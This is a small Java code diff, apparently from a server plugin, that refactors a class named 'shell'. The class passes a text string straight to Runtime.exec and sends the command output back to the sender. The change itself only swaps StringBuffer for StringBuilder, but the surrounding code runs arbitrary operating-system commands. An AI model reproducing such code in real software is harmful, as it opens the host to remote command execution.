@@ -32,10 +32,10 @@ public class shell implements Runnable {
     public void run() {
         Runtime runtime = Runtime.getRuntime();
         try (BufferedReader br = new BufferedReader(new InputStreamReader(runtime.exec(text).getInputStream()))) {
-            String line = null;
-            StringBuffer b = new StringBuffer();
+            String line;
+            StringBuilder b = new StringBuilder();
             while ((line = br.readLine()) != null) {
-                b.append(line + "\n");
+                b.append(line).append("\n");
             }
             sender.sendMessage(b.toString());
         } catch (Exception e) {
